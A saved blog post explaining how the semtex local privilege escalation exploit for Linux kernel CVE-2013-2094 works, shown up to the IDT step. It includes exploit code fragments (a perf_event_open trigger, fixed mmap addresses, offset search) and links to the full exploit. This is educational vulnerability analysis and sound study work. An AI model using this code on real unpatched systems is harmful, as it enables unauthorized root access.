<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0097)http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/ -->
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US"><head profile="http://gmpg.org/xfn/11"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>   A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094) at time to bleed by Joe Damato</title>

<meta name="description" content="technical ramblings from a wanna-be unix dinosaur">
<meta name="generator" content="WordPress 3.5.1"> <!-- leave this for stats please -->
<link href="./2013 - A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094)_files/style.css" rel="stylesheet" type="text/css" media="screen">
<link rel="alternate" type="application/rss+xml" title="time to bleed by Joe Damato RSS Feed" href="http://timetobleed.com/feed/">
<link rel="shortcut icon" type="image/x-png" href="http://timetobleed.com/wp-content/themes/journalist/favicon.png">
<link rel="pingback" href="http://timetobleed.com/xmlrpc.php">
				
	<!-- Google Analytics for WordPress by Yoast v4.0 | http://yoast.com/wordpress/google-analytics/ -->
	<script type="text/javascript" async="" src="./2013 - A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094)_files/ga.js.下載"></script><script type="text/javascript">//<![CDATA[
	var _gaq = _gaq || [];
	_gaq.push(['_setAccount','UA-9382151-1']);
	_gaq.push(['_trackPageview']);
	(function() {
		var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
		ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
		var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
	})();
	//]]></script>
	<!-- End of Google Analytics for WordPress by Yoast v4.0 -->
<link rel="alternate" type="application/rss+xml" title="time to bleed by Joe Damato » A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094) Comments Feed" href="http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/feed/">
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://timetobleed.com/xmlrpc.php?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://timetobleed.com/wp-includes/wlwmanifest.xml"> 
<link rel="prev" title="Digging out the craziest bug you never heard about from 2008: a linux threading regression" href="http://timetobleed.com/digging-out-the-craziest-bug-you-never-heard-about-from-2008-a-linux-threading-regression/">
<meta name="generator" content="WordPress 3.5.1">
<link rel="canonical" href="http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/">
<link rel="shortlink" href="http://wp.me/plbbC-DQ">
<link rel="stylesheet" href="./2013 - A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094)_files/geshi.css" type="text/css"><link rel="stylesheet" href="./2013 - A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094)_files/disqus.css" type="text/css" media="screen">		<style type="text/css">
						ol.footnotes li {list-style-type:decimal;}
						ol.footnotes{font-size:0.8em; color:#666666;}		</style>
			<link href="./2013 - A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094)_files/prettify.css" type="text/css" rel="stylesheet">
    <script type="text/javascript" src="./2013 - A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094)_files/prettify.js.下載"></script>
	<style type="text/css">
/* <![CDATA[ */
img.latex { vertical-align: middle; border: none; }
/* ]]> */
</style>
</head>

<body>
<div id="container" class="group">

<h1><a href="http://timetobleed.com/"><img src="./2013 - A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094)_files/logo.png" border="0" alt="time to bleed by Joe Damato"></a></h1>
<div id="bubble"><p>technical ramblings from a wanna-be unix dinosaur</p></div> <!-- erase this line if you want to turn the bubble off -->

<div id="content" class="group">

<h2 id="post-2470"><a href="http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/" rel="bookmark">A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094)</a></h2>
<p class="comments"><a href="http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/#comments"><span class="dsq-postid-2470">View Comments</span></a></p>

<div class="main">
	<p></p><center><img src="./2013 - A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094)_files/treeroot.jpg" alt="" width="213" height="320"></center><br>
If you enjoy this article, <a rel="alternate" type="application/rss+xml" href="http://feeds.feedburner.com/TimeToBleed" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-article&#39;,&#39;feeds.feedburner.com&#39;]);">subscribe (via RSS or e-mail)</a> and <a href="http://twitter.com/joedamato" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-article&#39;,&#39;twitter.com&#39;]);">follow me on twitter.</a><p></p>
<h2>tl;dr</h2>
<p>This article is going to explain how a recent <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2094" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-article&#39;,&#39;cve.mitre.org&#39;]);">privilege escalation exploit</a> for the Linux kernel works. This exploit affects CentOS 5 and 6 as well as other Linux distributions. Linux kernel version 2.6.37 to 3.8.9 are affected by this exploit. I will explain this exploit from the kernel side and the userland side to help readers get a better understanding of how exactly it works.</p>
<p><b>I did not write the original exploit and I did not discover this vulnerability. Full credit goes to the original author of the <a href="http://fucksheep.org/~sd/warez/semtex.c" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-article&#39;,&#39;fucksheep.org&#39;]);">exploit</a>.</b> I don’t do computer security in any professional capacity, but I do think unraveling exploits is fun and interesting.</p>
<p>First, let’s start with some helpful background information about a few different things and then I’ll tie them all together at the end to walk through the exploit itself.</p>
<h2><code>mmap</code> and <code>MAP_FIXED</code></h2>
<p><code>mmap</code> seems to <a href="http://timetobleed.com/digging-out-the-craziest-bug-you-never-heard-about-from-2008-a-linux-threading-regression/">come up</a> quite a bit in my blog posts. If you’ve never used it before, it is a system call that allows you to map regions of memory into your process’ address space.</p>
<p><code>mmap</code> can take a wide variety of flags. One useful flag is <code>MAP_FIXED</code>. This flag allows you to ask <code>mmap</code> to create a region of memory in your process’ address space starting at a specific address. Of course, this request may fail if another mapping is already present at the address you specify. </p>
<h2>The <code>syscall</code> wrapper function</h2>
<p>Not every system call supported by the Linux kernel has a corresponding wrapper function in <code>glibc</code> (or other library). There are many reasons why this can happen. Sometimes, a new version of a Linux distribution is cut before <code>glibc</code> has been updated to support the new kernel interface. Other times, the <code>glibc</code> team decides for whatever reason that a particular kernel feature will not have a corresponding userland wrapper function exposed.</p>
<p>If you need to call a particular system call for which no wrapper exists in <code>glibc</code>, you can use the generic function <code>syscall</code>.</p>
<p><code>syscall</code> works by allowing the programmer to pass in an arbitrary syscall number and an arbitrary set of arguments that will get passed over to the kernel. Sometimes, you can find a symbolic constant for the syscall number of the syscall you’d like to call in the <code>unistd.h</code> file for your system architecture.</p>
<p>On 64-bit CentOS 6, the header file <code>/usr/include/asm/unistd_64.h</code> contains lots of useful symbolic constants. For example, the constant for the syscall number for <code>getpid</code> looks something like this:</p>
<p></p><pre class="prettyprint"><span class="com">#define __NR_getpid &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;39</span></pre>
<p></p>
<h2>Interrupt Descriptor Table and <code>sidt</code></h2>
<p>I’ve written about the interrupt descriptor table (IDT) a <a href="http://timetobleed.com/a-few-things-you-didnt-know-about-signals-in-linux-part-1/">few</a> <a href="http://timetobleed.com/how-a-crazy-gnu-assembler-macro-helps-you-debug-grub-with-gdb/">times</a> before, but all you really need to know is that the IDT is essentially an array of structures that the CPU uses to determine what action to take when an exception or interrupt is raised on the system.</p>
<p>A register called the <code>IDTR</code> on x86 and x86_64 processors stores a structure which describes the length and starting address of the IDT. The format of the data in this register when the CPU is in 64-bit mode can be represented by the following packed structure in C:</p>
<p></p><pre class="prettyprint"><span class="com">/* 64bit IDTR structure */</span><span class="pln"><br></span><span class="kwd">struct</span><span class="pln"> </span><span class="pun">{</span><span class="pln"><br>&nbsp; uint16_t limit</span><span class="pun">;</span><span class="pln"><br>&nbsp; uint64_t addr</span><span class="pun">;</span><span class="pln"><br></span><span class="pun">}</span><span class="pln"> __attribute__</span><span class="pun">((</span><span class="pln">packed</span><span class="pun">))</span><span class="pln"> idtr</span><span class="pun">;</span></pre>
<p></p>
<p>The value of this register can be stored or loaded with the <code>sidt</code> and <code>lidt</code> instructions, respectively.</p>
<p>The instruction to load a value into the <code>IDTR</code>, <code>lidt</code>, may only be executed by privileged code (in our case, this means kernel code).</p>
<p>The instruction to store the value in the <code>IDTR</code>, <code>sidt</code> may be executed by unprivileged code (in our case, this means userland).</p>
<p>The entries in the <code>IDT</code> array have the following format when the CPU is in 64-bit mode<sup><a href="http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/#footnote_0_2470" id="identifier_0_2470" class="footnote-link footnote-identifier-link" title="Intel® 64 and IA-32 Architectures Software Developer’s Manual Volume 3A: System Programming Guide, Part 1, 5.1: Interrupt and Exception Overview">1</a></sup> :</p>
<p>
</p><center><img src="./2013 - A closer look at a recent privilege escalation bug in Linux (CVE-2013-2094)_files/idt.png" alt=""></center>
<p></p>
<h2>Rewriting the semtex exploit to make it a bit more clear</h2>
<p>I decided to rearrange the <a href="http://fucksheep.org/~sd/warez/semtex.c" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-article&#39;,&#39;fucksheep.org&#39;]);">original exploit</a> by adding white space, renaming functions, adding lots of comments, and moving some stuff around. I did this to help make the C code a bit more understandable to a beginner.</p>
<p>You can get the rewritten code from github <a href="https://github.com/realtalk/cve-2013-2094/blob/master/rewritten_semtex.c" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-article&#39;,&#39;github.com&#39;]);">here</a>.</p>
<h2>Linux kernel performance monitoring interface</h2>
<p>The Linux kernel provides a set of system calls for performance monitoring. Some of the information about the low level interfaces provided by the kernel can be found <a href="http://web.eece.maine.edu/~vweaver/projects/perf_events/index.html" onclick="javascript:_gaq.push([&#39;_trackEvent&#39;,&#39;outbound-article&#39;,&#39;web.eece.maine.edu&#39;]);">here</a>.
</p>
<p>In particular, the function <code>perf_event_open</code> can be called by userland code to obtain a file descriptor which allows a program to gather performance information. <code>perf_event_open</code> can eventually call <code>perf_swevent_init</code> which is an internal kernel function that is called when a user program is attempting to initialize a software defined event.</p>
<h2>Buggy increment in the kernel</h2>
<p>Let’s take a look at the structure definition for the first argument to the <code>perf_event_open</code> function, <code>struct perf_event_attr</code><sup><a href="http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/#footnote_1_2470" id="identifier_1_2470" class="footnote-link footnote-identifier-link" title=" /usr/include/linux/perf_event.h line 198 ">2</a></sup>:
</p>
<p></p><pre class="prettyprint"><span class="kwd">struct</span><span class="pln"> perf_event_attr </span><span class="pun">{</span><span class="pln"><br>&nbsp; </span><span class="com">/*<br>&nbsp; &nbsp;* Major type: hardware/software/tracepoint/etc.<br>&nbsp; &nbsp;*/</span><span class="pln"><br>&nbsp; __u32 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; type</span><span class="pun">;</span><span class="pln"><br><br>&nbsp; </span><span class="com">/*<br>&nbsp; &nbsp;* Size of the attr structure, for fwd/bwd compat.<br>&nbsp; &nbsp;*/</span><span class="pln"><br>&nbsp; __u32 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; size</span><span class="pun">;</span><span class="pln"><br><br>&nbsp; </span><span class="com">/*<br>&nbsp; &nbsp;* Type specific configuration information.<br>&nbsp; &nbsp;*/</span><span class="pln"><br>&nbsp; __u64 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; config</span><span class="pun">;</span><span class="pln"><br><br>&nbsp; </span><span class="com">/* ... */</span></pre>
<p></p>
<p>Notice that the field <code>config</code> is defined as a 64-bit unsigned integer.</p>
<p>Now let’s take a look at how <code>perf_swevent_init</code> uses the <code>config</code> field:</p>
<p></p><pre class="prettyprint"><span class="kwd">static</span><span class="pln"> </span><span class="kwd">int</span><span class="pln"> perf_swevent_init</span><span class="pun">(</span><span class="kwd">struct</span><span class="pln"> perf_event </span><span class="pun">*</span><span class="kwd">event</span><span class="pun">)</span><span class="pln"><br></span><span class="pun">{</span><span class="pln"><br>&nbsp; </span><span class="kwd">int</span><span class="pln"> event_id </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">event</span><span class="pun">-&gt;</span><span class="pln">attr</span><span class="pun">.</span><span class="pln">config</span><span class="pun">;</span><span class="pln"><br>&nbsp;<br>&nbsp; </span><span class="com">/* ... */</span><span class="pln"><br>&nbsp;<br>&nbsp; </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(</span><span class="pln">event_id </span><span class="pun">&gt;=</span><span class="pln"> PERF_COUNT_SW_MAX</span><span class="pun">)</span><span class="pln"><br>&nbsp; &nbsp; </span><span class="kwd">return</span><span class="pln"> </span><span class="pun">-</span><span class="pln">ENOENT</span><span class="pun">;</span><span class="pln"><br><br>&nbsp; </span><span class="com">/* ... */</span><span class="pln"><br>&nbsp; <br>&nbsp; atomic_inc</span><span class="pun">(&amp;</span><span class="pln">perf_swevent_enabled</span><span class="pun">[</span><span class="pln">event_id</span><span class="pun">]);</span><span class="pln"><br><br>&nbsp; </span><span class="com">/* ... */</span></pre>
<p></p>
<p>This looks bad because the unsigned 64-bit <code>config</code> field is being cast to a signed 32-bit integer. That value is then used as an index to an array called <code>perf_swevent_enabled</code>.</p>
<p>And, so:</p>
<ol>
<li>The user supplies a value for <code>config</code> which has (at least) the 31st bit set to <code>1</code>.</li>
<li>This value is truncated to 32-bits and stored as <code>event_id</code>.</li>
<li>The <code>if</code> statement checks <code>event_id</code> against <code>PERF_COUNT_SW_MAX</code> (which is <code>9</code> on CentOS 6 kernel <code>2.6.32-358.el6.x86_64</code>) to ensure that <code>event_id</code> is less than <code>PERF_COUNT_SW_MAX</code>. Any negative number will be, so execution continues.</li>
<li>The value in <code>event_id</code> is sign extended to 64-bits and then used as an offset into the <code>perf_swevent_enabled</code> array.</li>
<li>Thus, any value interpreted as negative from <code>event_id</code> will cause the kernel to call <code>atomic_inc</code> on a memory address that a user program can control.</li>
</ol>
<h2>Buggy decrement in the kernel</h2>
<p>Let’s now examine the code which is executed when the file descriptor is closed:</p>
<p></p><pre class="prettyprint"><span class="kwd">static</span><span class="pln"> </span><span class="kwd">void</span><span class="pln"> sw_perf_event_destroy</span><span class="pun">(</span><span class="kwd">struct</span><span class="pln"> perf_event </span><span class="pun">*</span><span class="kwd">event</span><span class="pun">)</span><span class="pln"><br></span><span class="pun">{</span><span class="pln"><br>&nbsp; u64 event_id </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">event</span><span class="pun">-&gt;</span><span class="pln">attr</span><span class="pun">.</span><span class="pln">config</span><span class="pun">;</span><span class="pln"><br><br>&nbsp; </span><span class="com">/* ... */</span><span class="pln"><br>&nbsp;<br>&nbsp; atomic_dec</span><span class="pun">(&amp;</span><span class="pln">perf_swevent_enabled</span><span class="pun">[</span><span class="pln">event_id</span><span class="pun">]);</span><span class="pln"><br><br>&nbsp; </span><span class="com">/* ... */</span></pre>
<p></p>
<p>This code is interesting because here the value in <code>config</code> is stored as an unsigned 64-bit value and used as an index into <code>perf_swevent_enabled</code>. This code path assumes that the open code path examined above will reject anyone with a config value that is too large.</p>
<p>However, as we saw above, if the user had successfully called <code>perf_event_open</code> with a large 64-bit unsigned value (which was interpreted as a 32-bit negative number) then the close code path will incorrectly offset from the <code>perf_swevent_enabled</code> with a large 64-bit unsigned value.</p>
<p>This allows a user program to cause the kernel to decrement an address that the userland program can control.</p>
<h2>Exploit summary</h2>
<p>
Before I dig into the exploit, let’s take a step back and summarize what this exploit will do:</p>
<ul>
<li>An initial memory region is allocated with <code>mmap</code> and <code>MAP_FIXED</code> and is used to determine where buggy increments and decrements will land when offset from<code>perf_swevent_enabled</code>.</li>
<li>A memory region is allocated where a NOP sled, a small piece of shellcode, and the malicious C code is copied.</li>
<li>The malicious code is rewritten at runtime to fill in values for the process’ uid and gid as well as the address of the upper 32-bits of the IDT handler for interrupt <code>4</code>.</li>
<li>The upper 32-bits of IDT handler for interrupt <code>4</code> are incremented by crafting a precise value for <code>perf_event_open</code>.</li>
<li>Interrupt <code>4</code> is triggered which executes the shell code and malicious code. The malicious code overwrites the uids and gids as well as the capability sets for the current process.</li>
<li>Once the interrupt handler returns and the exploit continues, it calls <code>setuid</code> to become root and then executes a <code>bash</code> shell as root.</li>
<li>Crazy shit.</li>
</ul>
<h2>Exploit</h2>
<p>The exploit will use these buggy increment and decrement paths to force the kernel to eventually transfer execution to a known userland address that contains malicious code which elevates the credentials of the process allowing it to execute a shell as root.</p>
<h3><u>A wrapper function for calling <code>perf_event_open</code></u></h3>
<p>The exploit contains a function called <code>sheep</code> which uses <code>syscall</code> (as described above) to call <code>perf_event_open</code>. I’ve renamed <code>sheep</code> in my rewrite to <code>break_perf_event_open</code> and rearranged the code to look like this:</p>
<p></p><pre class="prettyprint"><span class="kwd">static</span><span class="pln"> </span><span class="kwd">void</span><span class="pln"><br>break_perf_event_open </span><span class="pun">(</span><span class="pln">uint32_t off</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span><span class="pln"><br><br>&nbsp; </span><span class="kwd">struct</span><span class="pln"> perf_event_attr pea </span><span class="pun">=</span><span class="pln"> </span><span class="pun">{</span><span class="pln"><br>&nbsp; &nbsp; </span><span class="pun">.</span><span class="pln">type &nbsp; </span><span class="pun">=</span><span class="pln"> PERF_TYPE_SOFTWARE</span><span class="pun">,</span><span class="pln"><br>&nbsp; &nbsp; </span><span class="pun">.</span><span class="pln">size &nbsp; </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">sizeof</span><span class="pun">(</span><span class="kwd">struct</span><span class="pln"> perf_event_attr</span><span class="pun">),</span><span class="pln"><br>&nbsp; &nbsp; </span><span class="pun">.</span><span class="pln">config </span><span class="pun">=</span><span class="pln"> off</span><span class="pun">,</span><span class="pln"><br>&nbsp; &nbsp; </span><span class="pun">.</span><span class="pln">mmap &nbsp; </span><span class="pun">=</span><span class="pln"> </span><span class="lit">1</span><span class="pun">,</span><span class="pln"><br>&nbsp; &nbsp; </span><span class="pun">.</span><span class="pln">freq &nbsp; </span><span class="pun">=</span><span class="pln"> </span><span class="lit">1</span><span class="pun">,</span><span class="pln"><br>&nbsp; </span><span class="pun">};</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>&nbsp; </span><span class="com">/*<br>&nbsp; &nbsp;* there is no wrapper for perf_event_open in glibc (on CentOS 6, at least),<br>&nbsp; &nbsp;* so you need to use syscall(2) to call it.<br>&nbsp; &nbsp;*<br>&nbsp; &nbsp;* I copied the arguments out of the kernel (with the kernel explanation of<br>&nbsp; &nbsp;* some of them) here for convenience.<br>&nbsp; &nbsp;*/</span><span class="pln"><br>&nbsp; </span><span class="kwd">int</span><span class="pln"> fd </span><span class="pun">=</span><span class="pln"> syscall</span><span class="pun">(</span><span class="pln">__NR_perf_event_open</span><span class="pun">,</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="pun">&amp;</span><span class="pln">pea</span><span class="pun">,</span><span class="pln"> &nbsp; </span><span class="com">/* struct perf_event_attr __user *attr_uptr &nbsp; &nbsp; &nbsp; */</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="lit">0</span><span class="pun">,</span><span class="pln"> &nbsp; </span><span class="com">/* pid_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;pid &nbsp; &nbsp; &nbsp; (target pid) &nbsp; &nbsp; &nbsp;*/</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="pun">-</span><span class="lit">1</span><span class="pun">,</span><span class="pln"> &nbsp; </span><span class="com">/* int &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;cpu &nbsp; &nbsp; &nbsp; (target cpu) &nbsp; &nbsp; &nbsp;*/</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="pun">-</span><span class="lit">1</span><span class="pun">,</span><span class="pln"> &nbsp; </span><span class="com">/* int &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;group_fd &nbsp;(group leader fd) */</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="lit">0</span><span class="pun">);</span><span class="pln"> &nbsp; </span><span class="com">/* unsigned long &nbsp; &nbsp; &nbsp;flags &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; */</span><span class="pln"><br><br>&nbsp; </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(</span><span class="pln">fd </span><span class="pun">&lt;</span><span class="pln"> </span><span class="lit">0</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror</span><span class="pun">(</span><span class="str">"perf_event_open"</span><span class="pun">);</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit</span><span class="pun">(</span><span class="pln">EXIT_FAILURE</span><span class="pun">);</span><span class="pln"><br>&nbsp; </span><span class="pun">}</span><span class="pln"><br><br>&nbsp; </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(</span><span class="pln">close</span><span class="pun">(</span><span class="pln">fd</span><span class="pun">)</span><span class="pln"> </span><span class="pun">!=</span><span class="pln"> </span><span class="lit">0</span><span class="pun">)</span><span class="pln"> </span><span class="pun">{</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; perror</span><span class="pun">(</span><span class="str">"close"</span><span class="pun">);</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; exit</span><span class="pun">(</span><span class="pln">EXIT_FAILURE</span><span class="pun">);</span><span class="pln"><br>&nbsp; </span><span class="pun">}</span><span class="pln"><br><br>&nbsp; </span><span class="kwd">return</span><span class="pun">;</span><span class="pln"><br></span><span class="pun">}</span></pre>
<p></p>
<h3><u>Setting up an initial memory region with <code>mmap</code></u></h3>
<p></p><pre class="prettyprint"><span class="pln">map </span><span class="pun">=</span><span class="pln"> mmap</span><span class="pun">((</span><span class="kwd">void</span><span class="pln"> </span><span class="pun">*)</span><span class="pln"> </span><span class="lit">0x380000000</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x010000000</span><span class="pun">,</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PROT_READ </span><span class="pun">|</span><span class="pln"> PROT_WRITE</span><span class="pun">,</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MAP_FIXED </span><span class="pun">|</span><span class="pln"> MAP_ANONYMOUS </span><span class="pun">|</span><span class="pln"> MAP_PRIVATE</span><span class="pun">,</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="pun">-</span><span class="lit">1</span><span class="pun">,</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="lit">0</span><span class="pun">);</span></pre>
<p></p>
<p>The exploit begins by first creation a memory region with <code>mmap</code> at the address <code>0x380000000</code> for a length of <code>0x010000000</code> bytes (256 MB).</p>
<p>The address <code>0x380000000</code> was chosen because:</p>
<ul>
<li>The address of the <code>perf_swevent_enabled</code> array is <code>0xffffffff81f360c0</code>.</li>
<li>If the user passes -1 as <code>config</code> then the offset into the array in the <i>close path</i> will be: <code>0xffffffffffffffff * 4</code> (multiply by 4 we are doing pointer arithmetic on an array of <code>int</code>s).</li>
<li>Thus, a decrement will be performed at the address: <code>0x0000000381f360bc</code> for a <code>config</code> value of <code>-1</code>.</li>
<li>Similarly, a decrement will be performed at the address: <code>0x0000000381f360b8</code> for a <code>config</code> value of <code>-2</code>.</li>
</ul>
<p>Thus, a region starting at <code>0x380000000</code> and extending until <code>0x390000000</code> will contain the address that the kernel will write to when decrementing the <code>-1</code> and <code>-2</code> offsets of <code>perf_swevent_enabled</code>.</p>
<p>The exploit then fills this memory region with 0s and calls a function called <code>sheep</code> in the original exploit (aka <code>break_perf_event_open</code> in my rewrite):</p>
<pre class="prettyprint"><span class="pln"> &nbsp;memset</span><span class="pun">(</span><span class="pln">map</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0</span><span class="pun">,</span><span class="pln"> SIZE</span><span class="pun">);</span><span class="pln"><br><br>&nbsp; break_perf_event_open</span><span class="pun">(-</span><span class="lit">1</span><span class="pun">);</span><span class="pln"><br>&nbsp; break_perf_event_open</span><span class="pun">(-</span><span class="lit">2</span><span class="pun">);</span></pre>
<p></p>
<p>After the above exploit code executes an increment and decrement are performed in the kernel. The decrement lands somewhere on in the memory region allocated above.</p>
<h3><u>Find the offset into the memory region where the write occurred</u></h3>
<p>The exploit continues by iterating over the memory region to find where the decrement landed:
</p>
<p></p><pre class="prettyprint"><span class="com">/* this for loop corresponds with lines 66-69 of the original exploit */</span><span class="pln"><br><br></span><span class="kwd">for</span><span class="pln"> </span><span class="pun">(</span><span class="pln">i </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0</span><span class="pun">;</span><span class="pln"> i </span><span class="pun">&lt;</span><span class="pln"> SIZE</span><span class="pun">/</span><span class="lit">4</span><span class="pun">;</span><span class="pln"> i</span><span class="pun">++)</span><span class="pln"> </span><span class="pun">{</span><span class="pln"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>&nbsp; uint32_t </span><span class="pun">*</span><span class="pln">tmp </span><span class="pun">=</span><span class="pln"> map </span><span class="pun">+</span><span class="pln"> i</span><span class="pun">;</span><span class="pln"><br>&nbsp; </span><span class="com">/* <br>&nbsp; &nbsp;* check if map[i] (aka tmp) is non zero.<br>&nbsp; &nbsp;* also check if map[i+1] (aka tmp+1) is non zero.<br>&nbsp; &nbsp;*<br>&nbsp; &nbsp;* if both are non zero that means our calls above<br>&nbsp; &nbsp;* break_perf_event_open(-1) and break_perf_event_open(-2) have<br>&nbsp; &nbsp;* scribbled over memory this process allocated with mmap.<br>&nbsp; &nbsp;*/</span><span class="pln"><br>&nbsp; </span><span class="kwd">if</span><span class="pln"> </span><span class="pun">(*</span><span class="pln">tmp </span><span class="pun">&amp;&amp;</span><span class="pln"> </span><span class="pun">*(</span><span class="pln">tmp </span><span class="pun">+</span><span class="pln"> </span><span class="lit">1</span><span class="pun">))</span><span class="pln"> </span><span class="pun">{</span><span class="pln"><br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="kwd">break</span><span class="pun">;</span><span class="pln"><br>&nbsp; </span><span class="pun">}</span><span class="pln"><br></span><span class="pun">}</span></pre>
<p></p>
<h3><u>Retrieving the value of the <code>IDTR</code> and creating another memory region</u></h3>
<p>The exploit continues by:</p>
<ul>
<li>Retrieving the value stored in the <code>IDTR</code> with <code>sidt</code></li>
<li>Masking the upper 32 bits and the lower 24 bits of the 64-bit <code>IDT</code> base address away</li>
<li>Allocating a memory region starting at the adjusted address</li>
</ul>
